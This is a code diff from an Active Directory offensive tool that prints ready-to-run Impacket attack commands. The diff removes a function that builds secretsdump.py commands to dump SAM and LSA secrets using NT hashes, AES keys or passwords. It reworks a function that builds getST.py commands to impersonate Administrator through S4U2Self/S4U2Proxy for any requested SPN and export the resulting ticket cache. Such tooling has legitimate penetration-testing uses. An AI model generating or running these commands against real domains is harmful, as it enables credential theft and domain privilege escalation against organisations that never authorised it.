@@ -16,6 +16,9 @@ def vars(glob:dict, parent:Owned, target:LDAPObject=None, **more_vars):
             'target_no_dollar': target.name.replace('$', ''),
             'target_ip': f'{Fore.RED}{target.name.replace("$","")}_IP{Style.RESET_ALL}',
         })
+    if parent is not None and target is not None:
+        if parent.krb_need_fqdn:
+            v['target_no_dollar'] += f".{glob['fqdn']}"
     v.update(glob)
     v.update(more_vars)
     return v
@@ -72,28 +75,6 @@ def TGTRequest(glob:dict, parent:Owned, nopass=False):
     parent.krb_auth = True
 
 
-def Secretsdump(glob:dict, parent:Owned, target:LDAPObject):
-    v = vars(glob, parent, target,
-                plain=f'{Fore.RED}PLAIN_PASSWORD_HEX{Style.RESET_ALL}')
-
-    comment = "Dump the SAM and LSA cache on {target.name} to get the plain_password_hex"
-
-    if parent.krb_auth:
-        cmd = "secretsdump.py '{target_no_dollar}' -k -no-pass -dc-ip {dc_ip} -target-ip {target_ip}"
-    elif parent.secret_type == c.SECRET_NTHASH:
-        cmd = "secretsdump.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -hashes :{parent.secret} -dc-ip {dc_ip} -target-ip {target_ip}"
-    elif parent.secret_type == c.SECRET_AESKEY:
-        cmd = "secretsdump.py '{fqdn}/{parent.obj.name}@{target_no_dollar}' -k -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -target-ip {target_ip}"
-    elif parent.secret_type == c.SECRET_PASSWORD:
-        cmd = "secretsdump.py '{fqdn}/{parent.obj.name}:{parent.secret}@{target_no_dollar}' -dc-ip {dc_ip} -target-ip {target_ip}"
-
-    print_line(comment, cmd, v)
-
-    comment = 'Get the AES key from the password for more convenience'
-    cmd = "./tools/aesKrbKeyGen.py '{fqdn}/{target.name}:{plain}'"
-    print_line(comment, cmd, v)
-
-
 # Special function which modify the secret_type to AES
 # The parent is the computer, if we have its ticket, hash or password
 # we can retrieve/compute its AES Key.
@@ -143,23 +124,31 @@ def GetAESOnHost(glob:dict, parent:Owned):
     parent.secret_type = c.SECRET_AESKEY
 
 
-def GetSTImpersonate(glob:dict, parent:Owned, target:LDAPObject, do_u2u:bool):
-    v = vars(glob, parent, target, do_u2u= ' -u2u' if do_u2u else '')
+def GetSTImpersonate(glob:dict, parent:Owned, requested_spn:str,
+                     do_u2u:bool, do_additional:str=''):
+    v = vars(glob, parent,
+        do_u2u= ' -u2u' if do_u2u else '',
+        do_additional=do_additional,
+        requested_spn=requested_spn)
 
-    comment = 'Ask a TGS on {target.name} and impersonate it to Administrator (S4U2Self + S4U2Proxy)'
+    comment = 'Ask a TGS for {requested_spn} and impersonate it to Administrator (S4U2Self + S4U2Proxy)'
 
     if parent.krb_auth:
-        cmd = "getST.py '{fqdn}/{parent.obj.name}' -k -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn 'HOST/{target_no_dollar}'{do_u2u}"
+        cmd = "getST.py '{fqdn}/{parent.obj.name}' -k -no-pass -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
     elif parent.secret_type == c.SECRET_NTHASH:
-        cmd = "getST.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn 'HOST/{target_no_dollar}'{do_u2u}"
+        cmd = "getST.py '{fqdn}/{parent.obj.name}' -hashes :{parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
     elif parent.secret_type == c.SECRET_AESKEY:
-        cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn 'HOST/{target_no_dollar}'{do_u2u}"
+        cmd = "getST.py '{fqdn}/{parent.obj.name}' -no-pass -aesKey {parent.secret} -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
     elif parent.secret_type == c.SECRET_PASSWORD:
-        cmd = "getST.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -impersonate Administrator -spn 'HOST/{target_no_dollar}'{do_u2u}"
+        cmd = "getST.py '{fqdn}/{parent.obj.name}:{parent.secret}' -dc-ip {dc_ip} -impersonate Administrator -spn '{requested_spn}'{do_u2u}{do_additional}"
 
     print_line(comment, cmd, v, end=False)
-    print_cmd("export KRB5CCNAME='Administrator@HOST_{target_no_dollar}@{fqdn}.ccache'", v)
+
+    v['requested_spn'] = v['requested_spn'].replace('/', '_')
+    print_cmd("export KRB5CCNAME='Administrator@{requested_spn}@{fqdn}.ccache'", v)
     print()
+
+    parent.krb_auth = True
 
 
 # View or modify an ldap attribute
